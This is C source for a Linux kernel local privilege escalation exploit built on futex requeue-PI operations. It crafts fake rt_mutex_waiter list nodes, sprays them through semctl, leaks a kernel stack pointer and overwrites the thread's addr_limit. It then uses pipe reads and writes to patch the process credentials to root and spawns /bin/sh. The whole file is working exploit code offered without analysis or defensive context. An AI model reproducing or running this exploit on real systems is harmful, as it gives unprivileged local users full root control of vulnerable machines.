#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <linux/futex.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/syscall.h>


#define PRIO_BASE 120

#define PRIO_WAITER 10 /* slow down while loop */
#define PRIO_FAKE 4

#define PRIO_1ST  6
#define PRIO_LOCK2 7
#define PRIO_2ND  9

#define PRIO_LOCK1 2


int A, B;
int sem;
int overwrite_flag;
unsigned long thread_info;

struct list_head {
    struct list_head *next;
    struct list_head *prev;
};

struct plist_node {
    int         prio;
    struct list_head    prio_list;
    struct list_head    node_list;
};

struct rt_mutex_waiter {
    struct plist_node   list_entry;
    struct plist_node   pi_list_entry;
    struct task_struct  *task;
    struct rt_mutex     *lock;
};

int
futex_cmp_requeue_pi(int *uaddr1, int *uaddr2)
{
    return syscall(__NR_futex, uaddr1, FUTEX_CMP_REQUEUE_PI, 1, NULL, uaddr2, *uaddr1);
}

int
futex_wait_requeue_pi(int *uaddr, int *uaddr2)
{
    return syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, *uaddr, 0, uaddr2, 0);
}

int
futex_lock_pi(int *uaddr)
{
    return syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, *uaddr, 0, 0, 0);
}

void exploit(int signum)
{
    int fd[2];
    pipe(fd);
    unsigned long pointer;

    if (write(0, thread_info, 0x30) < 0) {
        perror("write");
        return;
    }

    printf("uid: %d\n", getuid());

    write(fd[1], "\xff\xff\xff\xff\xff\xff\xff\xff", 8);
    read(fd[0], thread_info+0x20, 8);

    write(fd[1], thread_info, 8);
    read(fd[0], &pointer, 8);   /* thread_info.task */
    printf("task_struct: %p\n", pointer);

    write(fd[1], pointer+0x4a0, 8);
    read(fd[0], &pointer, 8);   /* cred */
    printf("cred: %p\n", pointer);

    int cred[4*8];
    memset(cred, 0, 32);
    write(fd[1], cred, 8*4);
    read(fd[0], pointer+4, 8*4);

    printf("uid: %d\n", getuid());

    system("/bin/sh");
}

void *lock(void *args)
{
    struct sigaction act;
    memset(&act, 0, sizeof act);
    act.sa_handler = exploit;
    sigaction(30, &act, NULL);

    setpriority(PRIO_PROCESS, 0, (long)args);
    
    if (futex_lock_pi(&B) < 0) {
        perror("lock");
        return 0;
    }

    puts("lock wake up");
}

struct rt_mutex_waiter *waiters;

void *wait(void *args)
{
    /* setup fake node */
    
#define NSEMS 256
    char *p = malloc(NSEMS * 2);
    struct rt_mutex_waiter *overlap_waiter = p + 8;   /* hard coded offset 8 */
    overlap_waiter->list_entry.prio = PRIO_BASE+PRIO_FAKE;
    overlap_waiter->list_entry.prio_list.next =
        &((struct rt_mutex_waiter*)waiters)->list_entry.prio_list;

    setpriority(PRIO_PROCESS, 0, PRIO_WAITER);

    futex_wait_requeue_pi(&A, &B);

    puts("wait wake up");

    while (1)
        semctl(sem, -1, SETALL, p);
}

void setup_waiter()
{
    memset(waiters, 0, 2 * sizeof(struct rt_mutex_waiter));
    waiters[0].list_entry.prio = PRIO_BASE + PRIO_1ST;
    waiters[1].list_entry.prio = PRIO_BASE + PRIO_2ND;
    waiters[0].list_entry.prio_list.next = &waiters[1].list_entry.prio_list;
    waiters[1].list_entry.prio_list.prev = &waiters[0].list_entry.prio_list;
    waiters[0].list_entry.node_list.next = &waiters[1].list_entry.node_list;
    waiters[1].list_entry.node_list.prev = &waiters[0].list_entry.node_list;
}

int main()
{
    pthread_t tid, exp;
    int ret;

    /* prepare fake nodes */
    if ((sem = semget(IPC_PRIVATE, 100, IPC_CREAT|0660)) < 0) {
        perror("semget");
        exit(-1);
    }

    waiters = calloc(2, sizeof(struct rt_mutex_waiter));
    setup_waiter();

    /* exploit futex */
    pthread_create(&tid, 0, wait, 0);

    futex_lock_pi(&B);

    puts("enter to 1st requeue");
    getchar();
    while (futex_cmp_requeue_pi(&A, &B) < 0);

    pthread_create(&tid, 0, lock, (void *)PRIO_LOCK1);

    puts("enter to 2nd requeue");
    getchar();
    B = 0;
    futex_cmp_requeue_pi(&B, &B);

    puts("enter to 3rd lock");
    getchar();
    pthread_create(&exp, 0, lock, (void *)PRIO_LOCK2);

    puts("print kernel pointer");
    getchar();
    printf("kernel pointer: %p\n", waiters[0].list_entry.node_list.next);

    thread_info = (unsigned long)waiters[0].list_entry.node_list.next & ~0x1ffful;
    printf("thread_info: %p\n", thread_info);

    /* overwrite addr_limit */
    while (1) {
        setup_waiter();
        waiters[1].list_entry.node_list.prev = thread_info+0x20;
        pthread_create(&tid, 0, lock, (void *)PRIO_LOCK2);

        puts("test write");
        getchar();
        printf("new addr_limit: %p\n", waiters[1].list_entry.node_list.prev);
        if (waiters[1].list_entry.node_list.prev < thread_info)
            continue;

        ret = pthread_kill(exp, 30);
        if (ret != 0)
            fprintf(stderr, "%d", ret);
        break;
    }

    while (1) usleep(10);
}
